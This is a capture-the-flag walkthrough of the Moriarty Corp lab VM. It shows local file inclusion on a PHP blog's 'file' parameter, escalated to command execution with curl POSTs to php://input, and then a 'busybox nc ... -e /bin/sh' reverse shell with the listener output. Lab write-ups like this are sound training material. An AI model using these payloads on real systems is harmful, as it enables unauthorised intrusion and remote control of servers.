# BoredHackerBlog: Moriarty Corp Walkthrough

# Description
```bash
Hello Agent.

You're here on a special mission.

A mission to take down one of the biggest weapons suppliers which is Moriarty Corp.

Enter flag{start} into the webapp to get started!

Notes:

Web panel is on port 8000 (not in scope. Don’t attack)
Flags are stored in #_flag.txt format. Flags are entered in flag{} format. They're usually stored in / directory but can be in different locations.
To temporarily stop playing, pause the VM. Do not shut it down.
The webapp starts docker containers in the background when you add flags. Shutting down and rebooting will mess it up.
(the story is bad. sorry for the lack of creativity)

Difficulty: Med-Hard

Tasks involved:

port scanning
webapp attacks and bug hunting
pivoting (meterpreter is highly recommended)
password guessing/bruteforcing
Virtual Machine: - Format: Virtual Machine (Virtualbox OVA) - Operating System: Linux

Networking: - DHCP Service: Enabled - IP Address Automatically assign

This works better with VirtualBox rather than VMware.
```

# Exploitation
Let's start with a network scan
```bash
 Currently scanning: 192.168.0.1/24   |   Screen View: Unique Hosts                                                                                                                                               
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   58:11:22:85:0d:41      2     120  ASUSTek COMPUTER INC.                                                                                                                                          
 192.168.0.115   08:00:27:05:6f:31      1      60  PCS Systemtechnik GmbH   
```
\
Next, open ports
```bash
```
\

This  is a story mode style box , so opening port 8000 
\
<img width="1300" height="535" alt="image" src="https://github.com/user-attachments/assets/07e6e1bf-108b-46d3-8ea1-a39aa20810e8" />
\
So enter the flag "flag{start}" in the box to start
\
<img width="1194" height="544" alt="image" src="https://github.com/user-attachments/assets/a44fbb5b-f545-43ae-9501-d4b130074ec9" />
\
Now , the port 80 is open and available to access
\
Basic website with 2 links 
\
<img width="436" height="195" alt="image" src="https://github.com/user-attachments/assets/ed32ba66-cb3e-48e7-a2eb-81cf411646a8" />
\
If we click on one of them and see the url , it has a file parameter
\
<img width="983" height="433" alt="image" src="https://github.com/user-attachments/assets/f6e9598e-c399-4947-8474-534654466dfb" />
\
So i try to test for LFI vulnerability
\
<img width="699" height="756" alt="image" src="https://github.com/user-attachments/assets/95ce3330-cc62-4b41-8c6b-6cb00070a2a9" />
\
It works , so i start enumerating for files to try to chain attacks or get useful info
\
After wasting a lot of time , i read the description again and realize that i have to find the flag which is of the format "#_flag.txt" from the "/" directory of the target machine
\
<img width="492" height="213" alt="image" src="https://github.com/user-attachments/assets/bdbd51a5-062d-4852-9a4c-ba5ca903f0ba" />
\
After entering the flag on port 8000 , we now get more information
\
<img width="1202" height="534" alt="image" src="https://github.com/user-attachments/assets/5962dd58-a212-4776-98dd-c91de2ca5854" />
\
After wasting a lot of time , i realized what if i used php filters to get the source code of the app
\
<img width="1681" height="661" alt="image" src="https://github.com/user-attachments/assets/08f0456c-0f6d-4392-92ab-000bb9f02efb" />
\
Actually i was fuzzing for readable files and found the app directory as "/app"  from the file "/etc/apache2/httpd.conf"
```bash
<Directory "/app/">
	AllowOverride All
</Directory>
```
\
Even if we dont use "/app" in the request , it will relatively get the same result , since the app is running in same directory
\
After realizing that the source code had "include" function of php , we know that it can execute php commands
```bash
$incfile = $_REQUEST["file"];
include($incfile);
```
\
So i test a POST curl command
```bash
curl -X POST "http://192.168.0.116/?file=php://input" -d "<?php system('id'); ?>"
<html>
<head>
<title>Welcome to Moriarty Corp. Blog</title>
</head>
<body>
<p>
Welcome to Moriarty Corp. Blog. All our business is legit.
<br/>
Check out our blog posts:<br/>
<a href="/?file=page1.html">Blog Post 1</a><br/>
<a href="/?file=page2.html">Blog Post 2</a><br/>
</p>
<p>
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
</p>
</body>
</html>
```
\
Then to convert into a reverse shell i used the command
```bash
curl -X POST "http://192.168.0.116/?file=php://input" -d "<?php system('busybox nc 192.168.0.124 4444 -e /bin/sh'); ?>"
```
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.124
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 6b0391ef95b7~192.168.0.116-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Cannot upgrade shell with the available binaries...

  1) Upload https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
  2) Upload local socat binary
  3) Specify remote socat binary path
  4) None of the above

[?] Select action: 1
[•] Download URL: https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
 ⤷ [########################################] 100% (366.4 KBytes/366.4 KBytes) | Elapsed 0:00:00
[+] Upload OK /var/tmp/socat

[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 192.168.0.124:4444
[+] Got reverse shell from 6b0391ef95b7~192.168.0.116-Linux-x86_64 😍 Assigned SessionID <2>
[+] Shell upgraded successfully using /var/tmp/socat! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/6b0391ef95b7~192.168.0.116-Linux-x86_64/2026_04_21-09_46_28-492.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
/bin/sh: id
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
/app $ 

```
\
